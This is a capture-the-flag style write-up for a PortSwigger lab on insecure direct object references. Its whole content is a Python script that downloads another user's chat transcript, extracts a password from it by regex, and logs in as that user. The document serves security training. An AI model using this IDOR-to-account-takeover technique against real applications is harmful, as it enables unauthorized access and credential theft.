# Lab: Insecure direct object references

Link to lab: https://portswigger.net/web-security/access-control/lab-insecure-direct-object-references

## Solution

```python
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup


url = 'https://0a73003e040e7250c183fe34000500c4.web-security-academy.net/'

# Get carlos password

session = requests.Session()

response = session.get(
    url + 'download-transcript/1.txt',
    verify=False,
    allow_redirects=False
)

pattern = r'\b\w{20}\b'
password = re.search(pattern, response.text).group()

# Get login

response = session.get(
    url + 'login',
    verify=False
)

soup = BeautifulSoup(response.text, 'html.parser')
csrf = soup.find('input', {'name':'csrf'})['value']

# Post login

data = {
    'csrf': csrf,
    'username': 'carlos',
    'password': password
}

response = session.post(
    url + 'login',
    data=data,
    verify=False
)

print(response.text)
```